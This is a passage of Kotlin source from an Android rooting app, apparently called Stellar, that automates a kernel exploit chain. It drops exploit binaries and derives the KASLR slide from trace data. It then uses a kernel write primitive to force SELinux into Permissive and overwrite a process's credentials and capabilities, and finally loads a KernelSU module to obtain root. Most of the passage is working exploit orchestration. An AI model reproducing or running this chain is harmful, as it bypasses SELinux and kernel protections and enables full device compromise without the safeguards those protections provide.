            "{ ln -f " + shQuote(cachePath) + " " + shQuote(d) + " 2>/dev/null || cp -f " + shQuote(cachePath) + " " + shQuote(d) + "; } && chmod " + mode + " " + shQuote(d) + " || echo LINK_FAILED"
        }
        val r = ShizukuShell.run(cmd + "; echo LINK_DONE", 30)
        val ok = r.code == 0 && !r.output.contains("LINK_FAILED")
        if (!ok) log("缓存硬链接失败：" + r.output.trim())
        return ok
    }


    private fun ksudDestTag(kind: String): String = when (kind) {
        "next" -> "ksud_next"
        "bakasu" -> "ksud_bakasu"
        "sukisu" -> "ksud_sukisu"
        "finasu" -> "ksud_finasu"
        else -> "ksud_official"
    }

    private fun pkillExploitHelpers() {
        ShizukuShell.run(
            "pkill -f 'trace_pipe_raw' 2>/dev/null; sleep 1; true", 15
        )
    }

    // ------------------------------------------------------------- 管理器检查
    /** 从 ksud debug info 识别当前内核管理器；兼容 4 种管理器不同的输出格式。 */
    private fun detectLoadedSpec(info: String): ManagerSpec? {
        if (!RootDiagnostics.hasLine(info, "uapi_version: 5") && !RootDiagnostics.hasLine(info, "uapi_version: 6")) return null
        // 1) 新版 ksud 会输出 full_version，直接按名字识别
        val fullVersion = info.split("\n").firstOrNull { it.trimStart().startsWith("full_version:") } ?: ""
        val lower = fullVersion.lowercase()
        val byName = when {
            lower.contains("bakasu") || lower.contains("resukisu") -> "bakasu"
            lower.contains("finasu") -> "finasu"
            lower.contains("sukisu") -> "sukisu"
            lower.contains("next") || lower.contains("ksun") -> "next"
            lower.contains("kernelsu") -> "kernelsu"
            else -> null
        }
        if (byName != null) {
            log("  识别管理器（full_version）: " + byName)
            return specs[byName]
        }
        // 2) 老版 ksud 只有 version 数字
        val byVersion = when {
            RootDiagnostics.hasLine(info, "version: 41140") -> "sukisu"
            RootDiagnostics.hasLine(info, "version: 41027") -> "sukisu"
            RootDiagnostics.hasLine(info, "version: 40994") -> "sukisu"
            RootDiagnostics.hasLine(info, "version: 35235") -> "bakasu"
            RootDiagnostics.hasLine(info, "version: 33168") -> "finasu"
            RootDiagnostics.hasLine(info, "version: 33167") -> "finasu"
            RootDiagnostics.hasLine(info, "version: 33156") -> "finasu"
            RootDiagnostics.hasLine(info, "version: 33155") -> "finasu"
            RootDiagnostics.hasLine(info, "version: 33034") -> "finasu"
            RootDiagnostics.hasLine(info, "version: 33355") -> "next"
            RootDiagnostics.hasLine(info, "version: 33311") -> "next"
            RootDiagnostics.hasLine(info, "version: 32680") -> "kernelsu"
            else -> null
        }
        if (byVersion != null) {
            log("  识别管理器（version）: " + byVersion)
            return specs[byVersion]
        }
        // 3) 兜底：只安装了一个管理器时直接用它
        val installed = specs.values.filter { pkgInstalled(it.pkg) }
        return if (installed.size == 1) {
            log("  按已安装管理器识别: " + installed[0].kind)
            installed[0]
        } else null
    }

    private fun pkgInstalled(pkg: String): Boolean = try {
        ctx.packageManager.getPackageInfo(pkg, 0)
        true
    } catch (e: Exception) {
        false
    }

    private fun checkManager(spec: ManagerSpec): Boolean {
        step("检查 " + spec.label + " 管理器")
        val pm = ctx.packageManager
        val pi = try {
            pm.getPackageInfo(spec.pkg, 0)
        } catch (e: PackageManager.NameNotFoundException) {
            log("请先安装 " + spec.label + " 管理器（包名 " + spec.pkg + "）。")
            return false
        }
        val actualVersion = pi.versionName ?: "未知版本"
        log("  已安装 " + spec.label + " " + actualVersion)
        // 管理器版本/签名只提示不拦截：LKM + ksud 已内置配对，管理器版本不同也能正常工作。
        spec.expectedVersion?.let { want ->
            if (actualVersion.removePrefix("v") != want.removePrefix("v")) {
                log("  提示：推荐 " + spec.label + " " + want + "，当前 " + actualVersion + "；不影响继续越狱。")
            }
        }
        return true
    }

    // --------------------------------------------------------- 配套用户态投放
    private fun stageRootUserspace(spec: ManagerSpec): Boolean {
        step("准备 " + spec.label + " 配套用户态")
        // 关键：先创建本次唯一工作目录。ShizukuShell.stageBytes 只会 mkdir 旧的固定目录，
        // 不建这里的话 unique workDir 不存在，会报 ".../su_forward.tmp: No such file or directory"。
        val mk = ShizukuShell.run("mkdir -p " + workDir + " && chmod 755 " + workDir, 30)
        if (mk.code != 0) {
            log("创建工作目录失败：" + mk.output.trim())
            return false
        }
        for ((asset, dest) in listOf(
            "ksu_grant" to "/data/local/tmp/ksu_grant",
            "su_forward" to workDir + "/su_forward",
            "root_stage_v24.sh" to "/data/local/tmp/root_stage.sh",
        )) {
            val r = ShizukuShell.stageAsset(ctx, asset, dest, 755)
            if (r.code != 0) {
                log(r.output)
                return false
            }
        }
        val daemon = extractKsud(spec)
        if (daemon == null || daemon.isEmpty()) {
            log("管理器中缺少 arm64 ksud")
            return false
        }
        val binary = ShizukuShell.stageBytes(daemon, workDir + "/ksud_manager", 755)
        if (binary.code != 0) {
            log(binary.output)
            return false
        }
        // perf_cred(PC) 固定读 /data/local/tmp/ksud342；perf_cred_sukisu 固定读 /data/local/tmp/onekey/ksud_sukisu。
        // 旧运行可能把 /data/local/tmp/onekey 留成 root 属主不可写：先改名再重建（rename 只需父目录可写）。
        ShizukuShell.run(
            "if [ -d /data/local/tmp/onekey ] && [ ! -w /data/local/tmp/onekey ]; then " +
                "mv /data/local/tmp/onekey /data/local/tmp/onekey.old.\$(date +%s) 2>/dev/null; fi; " +
                "mkdir -p /data/local/tmp/onekey && chmod 755 /data/local/tmp/onekey; true", 30
        )
        val bootstrap = ShizukuShell.stageBytes(daemon, spec.bootstrapPath, 755)
        if (bootstrap.code != 0) {
            log("  引导 ksud 投放失败（" + spec.bootstrapPath + "）：" + bootstrap.output)
            return false
        }
        val apkPath = try {
            ctx.packageManager.getApplicationInfo(spec.pkg, 0).sourceDir
        } catch (e: Exception) {
            ""
        }
        log("  管理器 APK: " + (if (apkPath.isNotEmpty()) apkPath else "未找到（将由 root 脚本再查）"))
        val files = linkedMapOf(
            "root_backend" to spec.backend,
            "root_manager_pkg" to spec.pkg,
            "root_manager_apk" to apkPath,
            "root_expected_uapi" to "5",
            "root_expected_version" to (spec.expectedKsudVersion ?: ""),
            "root_strict" to (if (spec.strict) "1" else "0"),
            "root_antiroot" to (if (disableAntiRoot) "1" else "0"),
            "root_su_compat" to (if (suCompatEnabled) "1" else "0"),
            "root_soft_reboot" to (if (softRebootEnabled) "1" else "0"),
        )
        for ((name, value) in files) {
            val r = ShizukuShell.stageBytes((value + "\n").toByteArray(Charsets.UTF_8), workDir + "/" + name, 644)
            if (r.code != 0) {
                log(r.output)
                return false
            }
        }
        // root 收尾脚本 /data/local/tmp/root_stage.sh 固定，用它旁边的 onekey_dir 找到本次唯一工作目录
        val dirFile = ShizukuShell.stageBytes((workDir + "\n").toByteArray(Charsets.UTF_8), "/data/local/tmp/onekey_dir", 644)
        if (dirFile.code != 0) {
            log(dirFile.output)
            return false
        }
        return true
    }

    /** 内置模块按设备 release 现场对齐 vermagic：同版本换 OTA 后依旧能载入。 */
    private fun stageAlignedLkm(asset: String, dest: String, release: String, cache: String): Boolean {
        val raw = try {
            ctx.assets.open(asset).use { it.readBytes() }
        } catch (e: Throwable) {
            log("读取内置模块失败：" + (e.message ?: e.javaClass.simpleName))
            return false
        }
        val aligned = runCatching { RuntimeExtractor.alignVermagic(raw, release) }.getOrElse {
            log("对齐 vermagic 失败，按原样投放：" + (it.message ?: "未知错误"))
            raw
        }
        if (aligned.size != raw.size) log("内置模块 vermagic 已对齐到 " + release)
        return stageBytesCached(aligned, "lkm-" + asset + "-" + release, listOf(dest), 644, cache)
    }

    private fun extractKsud(spec: ManagerSpec): ByteArray? {
        try {
            if (spec.bundledKsud != null) {
                return ctx.assets.open(spec.bundledKsud).use { Prep.readAsset(it) }
            }
            val info = ctx.packageManager.getApplicationInfo(spec.pkg, 0)
            val lib = File(info.nativeLibraryDir, "libksud.so")
            if (lib.isFile) return FileInputStream(lib).use { Prep.readAsset(it) }
            val apks = mutableListOf(info.sourceDir)
            info.splitSourceDirs?.let { apks.addAll(it) }
            for (apk in apks) {
                val zip = ZipFile(apk)
                try {
                    val entry = zip.getEntry("lib/arm64-v8a/libksud.so") ?: continue
                    return zip.getInputStream(entry).use { Prep.readAsset(it) }
                } finally {
                    zip.close()
                }
            }
        } catch (e: Exception) {
            log("提取管理器 ksud 失败：" + e)
        }
        return null
    }

    /** 只从管理器 APK 读取 libksud.so（版本与管理器/LKM 匹配），不读内置资产。 */
    private fun extractKsudFromManager(spec: ManagerSpec): ByteArray? {
        try {
            val info = ctx.packageManager.getApplicationInfo(spec.pkg, 0)
            val lib = File(info.nativeLibraryDir, "libksud.so")
            if (lib.isFile) return FileInputStream(lib).use { Prep.readAsset(it) }
            val apks = mutableListOf(info.sourceDir)
            info.splitSourceDirs?.let { apks.addAll(it) }
            for (apk in apks) {
                ZipFile(apk).use { zip ->
                    val entry = zip.getEntry("lib/arm64-v8a/libksud.so") ?: return@use
                    return zip.getInputStream(entry).use { Prep.readAsset(it) }
                }
            }
        } catch (e: Exception) {
            log("读取管理器 ksud 失败：" + e)
        }
        return null
    }

    // --------------------------------------------------------------- 利用链
    private fun exploitAndLoad(spec: ManagerSpec, permissiveStart: Boolean): Boolean {
        var permissive = permissiveStart
        step("清理上一次残留的漏洞进程")
        ShizukuShell.run(
            "for p in \$(pgrep -f '(^|/)(perf_cred|t64560_v36|t64560_v42)( |\$)'); do " +
                "[ \"\$(readlink /proc/\$p/cwd)\" = " + workDir + " ] && kill -9 \$p; done; true", 10
        )
        // 清理旧版本 v2.3.3 的可见 overlay（新版本默认不再创建）
        ShizukuShell.run(
            "for m in \$(awk '\$1==\"onekey-su\"{print \$2}' /proc/mounts 2>/dev/null); do umount \"\$m\" 2>/dev/null; done; " +
                "rm -rf /data/adb/onekey-su-compat 2>/dev/null; true", 20
        )

        step("准备目录")
        ShizukuShell.run("mkdir -p " + workDir + " && chmod 755 " + workDir, 30)

        step("投放漏洞组件（首次约 10-30 秒）")
        for (name in listOf("t64560_v36", "t64560_v42", "forker", "grab.sh")) {
            val r = ShizukuShell.stageAsset(ctx, name, workDir + "/" + name, 755)
            log("  " + r.output)
            if (r.code != 0) {
                log("投放失败，终止")
                return false
            }
        }
        val loader = ShizukuShell.stageAsset(ctx, spec.perfLoader, workDir + "/perf_cred", 755)
        log("  " + loader.output)
        if (loader.code != 0) {
            log("投放 loader 失败，终止")
            return false
        }

        step("抓取 sched_blocked_reason（约 60 秒，不动内核）")
        val grab = ShizukuShell.runStreaming("cd " + workDir + " && exec sh grab.sh", 300) { line -> log("  " + line) }
        log("  grab 退出码=" + grab.code)
        if (grab.code != 0) {
            log("抓取失败，终止")
            return false
        }

        step("反推 KASLR slide")
        val syms = try {
            ctx.assets.open("syms.txt").use { Prep.loadSymbols(it) }
        } catch (e: Exception) {
            log("读取符号表失败: " + e)
            return false
        }
        log("  符号表加载完成: " + syms.size + " 个")
        val binData = arrayOfNulls<ByteArray>(8)
        var usable = 0
        // 用 shell 读真实大小（应用进程 File API 在 SELinux/权限下可能看不到 shell 创建的文件）
        val sizes = ShizukuShell.run("cd " + workDir + " && wc -c bl_*.bin 2>/dev/null", 30)
        val sizeMap = HashMap<Int, Long>()
        for (line in sizes.output.split("\n")) {
            val parts = line.trim().split(Regex("\\s+"))
            if (parts.size >= 2) {
                val n = parts.last().removePrefix("bl_").removeSuffix(".bin").toIntOrNull()
                val sz = parts[0].toLongOrNull()
                if (n != null && sz != null && n in 0..7) sizeMap[n] = sz
            }
        }
        for (i in 0..7) {
            val sz = sizeMap[i] ?: 0L
            if (sz <= 0L) {
                log("  bl_" + i + ".bin 为空/不存在（该 CPU 无事件），跳过")
                continue
            }
            try {
                binData[i] = ShizukuShell.readDeviceFile(workDir + "/bl_" + i + ".bin")
                usable++
            } catch (e: Exception) {
                log("  读取 bl_" + i + ".bin 失败: " + e)
            }
        }
        if (usable == 0) {
            log("没有任何可用的 raw 抓包（bl_*.bin 全空），请重试")
            return false
        }
        val text = try {
            String(ShizukuShell.readDeviceFile(workDir + "/bl_text.txt"), Charsets.UTF_8)
        } catch (e: Exception) {
            log("读取文本锚点失败: " + e)
            return false
        }
        val bins = Array(8) { i -> binData[i] ?: ByteArray(0) }
        val sr = Prep.solveSlideBytes(bins, text, syms)
        if (!sr.ok) {
            log("slide 反推失败: " + sr.error)
            return false
        }
        log(
            "  slide=0x" + java.lang.Long.toHexString(sr.slide)
                + "  selinux_state=0x" + java.lang.Long.toHexString(sr.selinuxState)
                + "  (anchors=" + sr.anchors + ", votes=" + sr.votes + ")"
        )

        step("按当前 slide 重打 " + spec.label + " LKM")
        val ko = try {
            ctx.assets.open(spec.templateAsset).use { Prep.readAsset(it) }
        } catch (e: Exception) {
            log("读取 ko 模板失败: " + e)
            return false
        }
        val patched = Prep.patchKo(ko, syms, sr.slide)
        if (patched <= 0) {
            log("ko 打补丁失败")
            return false
        }
        log("  已补 " + patched + " 个符号（SHN_ABS）")
        val koR = ShizukuShell.stageBytes(ko, "/data/local/tmp/ksu-op3.ko", 644)
        log("  " + koR.output)
        if (koR.code != 0) {
            log("推送 ko 失败")
            return false
        }

        if (!permissive) {
            step("SELinux -> Permissive（零写 selinux_state-7）")
            val permTarget = hexAdd(sr.selinuxState, -7)
            val pr = ShizukuShell.runStreaming(
                "cd " + workDir + " && exec ./t64560_v36 0 " + permTarget + " 120 400 16 6000 12000 4500", 1500
            ) { line -> log("  " + line) }
            log("  v36 退出码=" + pr.code)
            if (pr.code != 0) {
                log("内核写入步骤失败，停止后续操作。")
                return false
            }
            val e2 = ShizukuShell.run("getenforce", 15).output.trim()
            log("  getenforce=" + e2)
            if (!e2.contains("Permissive")) {
                log("✗ permissive 未生效，终止")
                return false
            }
        } else {
            log("已是 Permissive，跳过")
        }

        step("启动 perf_cred，挑选 bit16=1 的 cred")
        var perf = pickCred()
        if (perf == null) {
            val enf = ShizukuShell.run("getenforce", 15).output.trim()
            log("✗ 取 cred 失败（当前 SELinux=" + enf + "）")
            if (!enf.contains("Permissive")) {
                log("→ 自动补做 SELinux permissive 后重试")
                if (runPermissive(sr)) perf = pickCred()
            }
            if (perf == null) {
                log("✗ 流程中止：perf_cred 拿不到 cred。请重启手机后重试，或把日志发给开发者（github.com/xingranya）")
                return false
            }
        }
        var caps: ShizukuShell.LineProc? = null
        try {
            val cred = perf.cred
            step("零写 cred+0x20（fsuid=fsgid=0）")
            val fsuidTarget = hexAdd(parseHex(cred), 0x20)
            val f1 = ShizukuShell.runStreaming(
                "cd " + workDir + " && exec ./t64560_v36 0 " + fsuidTarget + " 150 400 16 6000 12000 4500", 1500
            ) { line -> log("  " + line) }
            log("  v36 退出码=" + f1.code)
            if (f1.code != 0) {
                log("布局准备失败，停止后续操作。")
                return false
            }
            val layout = try {
                perf.proc.waitFor("LAYOUT_DONE", 180)
            } catch (e: InterruptedException) {
                null
            }
            if (layout == null) {
                log("✗ perf_cred 未到 LAYOUT_DONE（fsuid 未生效或 /data/adb 布局失败）")
                log("  perf 尾部: " + perf.proc.tail(8))
                return false
            }
            log("  perf_cred 已布局 /data/adb")

            step("写 cap_effective 并加载 LKM（最快约 1-3 分钟）")
            caps = try {
                ShizukuShell.start(
                    "cd " + workDir + " && exec ./t64560_v42 " + cred + " 90 90 400 16 6000 12000"
                ) { line -> log("  " + line) }
            } catch (e: Exception) {
                log("启动 v42 失败: " + e)
                return false
            }
            var mod: String? = null
            val end = SystemClock.elapsedRealtime() + 1_500_000L
            while (SystemClock.elapsedRealtime() < end) {
                mod = try {
                    perf.proc.waitFor("MODULE_LOADED", 2)
                } catch (e: InterruptedException) {
                    null
                }
                if (mod != null) {
                    val waitStart = SystemClock.elapsedRealtime()
                    var live = false
                    while (SystemClock.elapsedRealtime() - waitStart <= 180_000L) {
                        val line = kernelsuModuleLine()
                        if (RootDiagnostics.moduleLive(line)) {
                            mod = line
                            live = true
                            break
                        }
                        try {
                            Thread.sleep(500)
                        } catch (_: InterruptedException) {
                        }
                    }
                    if (!live) {
                        log("  ✗ 模块长时间未进入 Live：停止后续操作，请重启手机后重试")
                        caps?.destroy()
                        return false
                    }
                    break
                }
                val capsAlive = caps?.isRunning == true
                val perfAlive = perf.proc.isRunning
                if (!perfAlive) {
                    val line = kernelsuModuleLine()
                    if (RootDiagnostics.moduleLive(line)) mod = line
                    break
                }
                if (!capsAlive) break
            }
            caps?.destroy()
            if (!RootDiagnostics.moduleLive(mod)) {
                log("模块未确认就绪；perf 尾部: " + perf.proc.tail(4))
                return false
            }
            log("  ✓ " + mod!!.trim())
            try {
                Thread.sleep(2000)
            } catch (_: InterruptedException) {
            }
            val m = ShizukuShell.run("grep -i kernelsu /proc/modules; getenforce", 15)
            for (line in m.output.split("\n")) if (line.trim().isNotEmpty()) log("  " + line.trim())

            val ok = rootStageAndVerify()
            if (ok) {
                finishOk(spec)
            } else {
                progress(100)
                log("验收未通过：请把上面的日志发给开发者（github.com/xingranya）。")
            }
            return ok
        } finally {
            caps?.destroy()
            perf.proc.destroy()
        }
    }

    // ------------------------------------------------------------------ cred
    private class CredPick(val cred: String, val proc: ShizukuShell.LineProc)

    private fun pickCred(): CredPick? {
        // (cred+0x40) 的 bit16 约 1/2 概率为 1（CAP_SYS_MODULE），由 cred 地址所在 slab 页决定。
        // 顺序起进程会反复复用同一批 slab 页导致连续 bit16=0，
        // 因此一次并发起 8 个候选进程再挑选，最多 4 轮。
        val batch = 8
        for (round in 1..4) {
            val procs = ArrayList<ShizukuShell.LineProc>(batch)
            for (i in 0 until batch) {
                try {
                    procs.add(
                        ShizukuShell.start("cd " + workDir + " && exec ./perf_cred") { line -> log("    perf[" + (i + 1) + "]: " + line) }
                    )
                } catch (e: Exception) {
                    log("  启动 perf_cred 失败: " + e)
                }
            }
            if (procs.isEmpty()) return null
            var chosen: CredPick? = null
            var chosenProc: ShizukuShell.LineProc? = null
            for ((idx, proc) in procs.withIndex()) {
                val hit = try {
                    proc.waitFor("HIT pid=", 30)
                } catch (e: InterruptedException) {
                    null
                }
                if (hit == null) {
                    log("  [第" + round + "轮 #" + (idx + 1) + "] 无 HIT，末尾: " + proc.tail(4).replace("\n", " | "))
                    continue
                }
                val c = extract(hit, "ptr=")
                if (c == null) {
                    log("  [第" + round + "轮 #" + (idx + 1) + "] cred 解析失败")
                    continue
                }
                val bit16 = (((parseHex(c) + 0x40) shr 16) and 1L).toInt()
                log("  [第" + round + "轮 #" + (idx + 1) + "] cred=" + c + "  bit16(CAP_SYS_MODULE)=" + bit16)
                if (bit16 == 1) {
                    chosen = CredPick(c, proc)
                    chosenProc = proc
                    log("  ✓ 选中候选进程 #" + (idx + 1) + "（cred=" + c + "）")
                    break
                }
            }
            for (proc in procs) {
                if (proc !== chosenProc) runCatching { proc.destroy() }
            }
            if (chosen != null) return chosen
            log("  第 " + round + " 轮没有 bit16=1 的 cred，重试…")
            try {
                Thread.sleep(800)
            } catch (_: InterruptedException) {
            }
        }
        return null
    }

    private fun runPermissive(sr: Prep.SlideResult): Boolean {
        step("补做 SELinux -> Permissive（fallback）")
        val permTarget = hexAdd(sr.selinuxState, -7)
        val r = ShizukuShell.runStreaming(
            "cd " + workDir + " && exec ./t64560_v36 0 " + permTarget + " 120 400 16 6000 12000 4500", 1500
        ) { line -> log("  " + line) }
        if (r.code != 0) log("  v36 退出码=" + r.code)
        val enf = ShizukuShell.run("getenforce", 30).output.trim()
        log("  getenforce=" + enf)
        return r.code == 0 && enf.contains("Permissive")
    }

    // ------------------------------------------------------------- root 收尾
    private fun rootStageAndVerify(): Boolean {
        step("安装配套用户态并验证 su")
        val runId = UUID.randomUUID().toString()
        val token = ShizukuShell.stageBytes((runId + "\n").toByteArray(Charsets.UTF_8), workDir + "/root_run", 644)
        if (token.code != 0) {
            log(token.output)
            return false
        }
        // 与上游一致：优先 su -c 跑收尾脚本（内核 su 逃逸）；没有产出 OK 标记再退回 ksu_grant。
        var root = ShizukuShell.runStreaming(
            "exec /system/bin/su -c '/system/bin/sh /data/local/tmp/root_stage.sh' 2>&1", 600
        ) { line -> log("  " + line) }
        var marker = ShizukuShell.run("cat " + workDir + "/root_stage.ok 2>/dev/null", 10)
        var stageOk = RootDiagnostics.stagePassed(root.code, marker.output, runId)
        if (!stageOk) {
            log("  su 收尾未通过（exit=" + root.code + "），改用 ksu_grant 重试")
            root = ShizukuShell.runStreaming("exec /data/local/tmp/ksu_grant", 900) { line -> log("  " + line) }
            marker = ShizukuShell.run("cat " + workDir + "/root_stage.ok 2>/dev/null", 10)
            stageOk = RootDiagnostics.stagePassed(root.code, marker.output, runId)
        }
        log("  收尾脚本退出码=" + root.code + "，结果=" + (if (stageOk) "OK" else "FAIL"))
        val detail = ShizukuShell.run("tail -120 " + workDir + "/root_stage.log 2>&1", 10)
        for (line in detail.output.split("\n")) if (line.trim().isNotEmpty()) log("  " + line.trim())
        if (!stageOk) {
            log("root 环境检查失败；请查看安装、配套版本和 su 退出码。")
            return false
        }
        // 原生 su 自检（shell uid 2000，等价普通应用/终端）：内核 sucompat 正常时应直接返回 0
        val nativeProbe = ShizukuShell.run("timeout 8 /system/bin/su -c 'id -u' 2>&1", 15)
        val nativeOut = nativeProbe.output.trim()
        if (nativeOut == "0") {
            log("  ✓ 原生 su 已放行（管理器授权后应用/终端即可正常使用）")
        } else {
            log("  ⚠ 原生 su 未放行：" + nativeOut + "（把日志发给开发者定位）")
        }
        runCatching { suSelfTest() }
        return true
    }

    private fun suSelfTest(): Boolean {
        val probe = "u=\$(id -u) || exit 1; echo ROOT_UID=\$u; [ \"\$u\" = 0 ] || exit 1; " +
            "echo STDOUT_OK; echo STDERR_OK >&2; exit 0"
        val command = ShizukuShell.run("timeout 10 /system/bin/su -c '" + probe + "' 2>&1", 15)
        val pipe = ShizukuShell.run("printf '%s\\n' '" + probe + "' | timeout 10 /system/bin/su 2>&1", 15)
        val mount = ShizukuShell.run("timeout 10 /system/bin/su -M -c 'id -u' 2>&1", 20)
        log(
            "Stellar 会话 UID=" + ShizukuShell.serviceUid()
                + "；绝对路径 su 退出码=" + command.code + "，管道退出码=" + pipe.code + "，-M 退出码=" + mount.code
        )
        val ok = RootDiagnostics.suPassed(command.code, command.output) &&
            RootDiagnostics.suPassed(pipe.code, pipe.output)
        if (!ok) log("su 会话失败：\n" + command.output + pipe.output)
        log("全局挂载空间 su：" + mount.output.trim())
        log("其他应用的授权需用其自身 UID 验证；可先使用首页的「root 诊断」。")
        return ok
    }

    /** 收尾后确认默认 su 入口（PATH 调用 su 即 root）；未就绪自动重试，无需用户手动点修复。 */
    private fun ensureSuCompat() {
        if (!suCompatEnabled) {
            log("默认 SU 兼容层已关闭（隐藏环境优先）：未创建 /system_ext/bin/su")
            return
        }
        step("确认默认 SU 入口")
        for (attempt in 1..3) {
            val chk = ShizukuShell.run("[ -x /system_ext/bin/su ] && /system_ext/bin/su -c 'id -u' 2>/dev/null; true", 25)
            if (chk.output.trim() == "0") {
                log("  ✓ 默认 SU 已就绪（应用/终端按 PATH 调用 su 即可）")
                return
            }
            log("  默认 SU 未就绪（第 " + attempt + " 次检查），自动重新部署…")
            val r = ShizukuShell.runStreaming("exec /data/local/tmp/ksu_grant", 300) { line -> log("  " + line) }
            log("  重新部署退出码=" + r.code)
            try {
                Thread.sleep(1000)
            } catch (_: InterruptedException) {
            }
        }
        log("  ⚠ 默认 SU 仍未就绪：请在首页点「修复」重试")
    }

    private fun finishOk(spec: ManagerSpec) {
        ensureSuCompat()
        restartManager(spec)
        progress(100)
        stageSink("越狱完成")
        log("root 环境检查通过。请在 " + spec.label + " 中授权目标应用，再重新打开该应用。")
        log("重启后失效；下次重启只需：启动 Stellar → 点「一键越狱」。")
        log("作者：星苒鸭 · github.com/xingranya · xran.uk")
        cleanupTemp()
    }

    private fun restartManager(spec: ManagerSpec) {
        step("重启 " + spec.label + " 管理器（重新获取内核连接）")
        val r = ShizukuShell.run(
            "am force-stop " + spec.pkg + "; sleep 1; monkey -p " + spec.pkg + " -c android.intent.category.LAUNCHER 1 2>&1", 30
        )
        log("  " + r.output.trim().replace("\n", " | "))
    }

    private fun antiRootGuard() {
        if (!disableAntiRoot) {
            log("ANTIROOT_SKIP: 开关关闭，未禁用安全组件")
            return
        }
        step("临时禁用 ColorOS 安全组件（约 5 秒）")
        // 不再停用 com.oplus.exsystemservice：停用会导致系统截屏不可用。
        val e = ShizukuShell.run("/system/bin/su -c 'pm enable com.oplus.exsystemservice' 2>&1", 60)
        log("  " + e.output.trim())
        log("ANTIROOT_SKIP_SCREENSHOT: 保持截屏组件可用")
    }

    private fun cleanupTemp() {
        step("清理临时文件")
        // 清理本次目录、固定启动器、指针文件，以及旧版本遗留的 /data/local/tmp/onekey 目录
        val legacy = if (workDir != "/data/local/tmp/onekey") " /data/local/tmp/onekey /data/local/tmp/onekey.old.* /data/local/tmp/onekey-su" else ""
        val r = ShizukuShell.run(
            "rm -rf " + workDir + legacy +
                " /data/local/tmp/ksu_grant /data/local/tmp/root_stage.sh /data/local/tmp/onekey_dir" +
                " /data/local/tmp/ksu-op3.ko /data/local/tmp/ksud342 /data/local/tmp/ksud_next /data/local/tmp/ksud_bakasu /data/local/tmp/ksud_sukisu /data/local/tmp/ksud_kernelsu" +
                " /data/local/tmp/onekey_mgr_apk /data/local/tmp/onekey_mgr_pkg /data/local/tmp/su_repair_launch.log" +
                " /data/local/tmp/root_run /data/local/tmp/root_backend /data/local/tmp/root_manager_pkg" +
                " /data/local/tmp/root_expected_uapi /data/local/tmp/root_expected_version /data/local/tmp/root_strict" +
                " /data/local/tmp/root_antiroot /data/local/tmp/root_su_compat; echo TEMP_CLEANED", 60
        )
        log("  " + r.output.trim())
        runCatching { TempJanitor.sweep(ctx, null) }
    }

    // ----------------------------------------------------------------- utils
    private fun kernelsuModuleLine(): String? {
        val chk = ShizukuShell.run("grep -i kernelsu /proc/modules", 8)
        for (line in chk.output.split("\n")) {
            val t = line.trim()
            if (t.startsWith("kernelsu ")) return t
        }
        return null
    }

    private fun extract(line: String, key: String): String? {
        val i = line.indexOf(key)
        if (i < 0) return null
        val s = i + key.length
        var e = s
        while (e < line.length) {
            val c = line[e]
            if (c in '0'..'9' || c in 'a'..'f' || c in 'A'..'F' || c == 'x') e++ else break
        }
        if (e <= s) return null
        return line.substring(s, e)
    }

    private fun parseHex(s: String): Long = java.lang.Long.parseUnsignedLong(s.removePrefix("0x"), 16)

    private fun hexAdd(v: Long, delta: Long): String = "0x" + java.lang.Long.toHexString(v + delta)
}
